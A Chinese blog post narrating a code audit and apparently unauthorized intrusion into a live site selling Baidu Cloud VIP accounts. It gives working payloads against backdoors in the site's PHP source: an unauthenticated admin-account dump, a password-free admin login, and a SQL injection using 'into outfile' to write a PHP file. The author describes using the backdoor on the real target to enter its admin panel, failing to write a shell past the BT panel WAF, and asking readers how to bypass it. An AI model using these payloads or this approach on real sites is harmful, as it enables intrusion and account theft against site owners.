---
title: "记一次由百度云会员引起的渗透"
date: 2019-04-03T13:18:55+08:00
draft: false
tags: ['php','sql','vip']
categories: ['代码审计','渗透测试']
---

百度云盘真的恶心，不开会员10k/s。

<!--more-->

## 前言

前天找了点域渗透的环境和资料，都是百度云盘存储的，一个镜像十几个g，下不下来，发现网上有卖百度云VIP账号的，都是一些发卡网，刚好自己最近在学代码审计，就想着下载一套源码自己看看能不能审出漏洞。没想到还真看出来了点东西。

## 开搞

目标站点`xx.com`扫出了`readme.txt`，是**企业版PHP自动发卡源码免授权优化版**

![](https://y4er.com/img/uploads/20190509165269.jpg)

看到这免授权优化版我就知道有戏，很可能存在后门。网上找了一套

![](https://y4er.com/img/uploads/20190509162439.jpg)

目录结构和目标站点一样，应该就是这套了。

本地搭建，然后源代码扔到seay先跑着，我先大概看下架构

`index.php`入口

![](https://y4er.com/img/uploads/20190509168352.jpg)

典型的mvc架构

![](https://y4er.com/img/uploads/20190509168398.jpg)

伪静态重写URL

![](https://y4er.com/img/uploads/20190509167137.jpg)

代码审计这方面我是新手，所以我的目标是找找sql注入、未授权访问、上传点以及越权，当然考虑到是免授权优化版，我还可以找找后门：文件遍历或者代码执行

## [后门?]文件遍历

`/bom.php`的`checkdir()`函数

![](https://y4er.com/img/uploads/20190509169865.jpg)

![](https://y4er.com/img/uploads/20190509163282.jpg)

递归遍历当前目录下的所有文件。

这个文件应该是去除文件的bom头，不知道算不算后门。

## 过滤方式

`\includes\libs\Functions.php`

![](https://y4er.com/img/uploads/20190509168122.jpg)

全局`makeSafe()`函数过滤，强转数字，`addslashes()`和`mysql_real_escape_string()`转义字符串，`strip_tags`去除html标签

`\includes\libs\Mysql.php`

MySQL使用UTF8编码

![](https://y4er.com/img/uploads/20190509169572.jpg)

我发现的SQL语句变量全部使用单引号进行包裹，寄希望于seay，暂放。

## [后门]获取管理员账户

`\admin\adminInfo.php`没有鉴权

![](https://y4er.com/img/uploads/20190509165310.jpg)

```php
function getmethod(){
	$ob = new Admin_Model();
	$items = $ob->getData(1, 10, "WHERE id <> -1");	
	$index = 0;
	echo "<table border='1' style=''>";
	foreach($items as $item){
		echo "<tr>";
		$index ++;
		if($index == 1){		
			foreach($item as $key => $val){
				if(preg_match("/^\d*$/",$key)){
					continue;
				}
				echo "<th>$key</th>";
			}
			echo "</tr>";
			echo "<tr>";
		}
		foreach($item as $key => $val){
			if(preg_match("/^\d*$/",$key)){
				continue;
			}
			echo "<td>$val</td>";	
		}
		echo "</tr>";
	}
	echo "</table>";
}
```

payload：`/admin/adminInfo.php?action=get`

## [后门]无需密码登录后台

还是`\admin\adminInfo.php`

```php
function infomethod(){
	$ob = new Admin_Model();
	$u = $ob->getOneData($_GET['id']);
	$_SESSION['login_adminname']=$u['username'];
	$_SESSION['login_adminid']=$u['id'];
	$_SESSION['login_adminutype']=$u['utype'];
	$_SESSION['login_adminlimit']=explode('|',$u['adminlimit']);
}
```

payload:先访问`/admin/adminInfo.php?action=info&id=1`然后访问`/admin/`

## [后门]SQL注入

还是`\admin\adminInfo.php`的`infomethod()`函数

```php
$u = $ob->getOneData($_GET['id']);
```

id直接代入数据库查询，可尝试`into outfile`

payload

```
http://go.go/admin/admininfo.php?action=info&id=-1 union select 1,2,3,4,5,6,7,8,9,10,'<?php phpinfo()?>' into outfile 'E:/WWW/faka/1.php'
```

## 后台任意文件上传

`/admin/set.php`未对文件后缀校验

![](https://y4er.com/img/uploads/20190509169338.jpg)

![](https://y4er.com/img/uploads/20190509161320.jpg)

## 漏洞利用

文件遍历拿到后台=>`adminInfo.php`拿到管理员账户或直接登陆=>任意文件上传拿shell

## 实战

后门进入后台，上传没有写文件权限，sql注入outfile写文件被宝塔拦截，尝试多种方法无果，放弃，毕竟账号已经有了，下东西去。

![](https://y4er.com/img/uploads/20190509162833.jpg)

ps:我没想到一个卖百度云账号的流水一天也能7k

## 总结

网站是死的，思路是活的。渗透测试的精髓是指哪打哪，希望我可以做到。**另外如果有师傅知道怎么绕过宝塔写shell的请pm我，感激不尽。**有在学代码审计的同学也欢迎找我交流哦！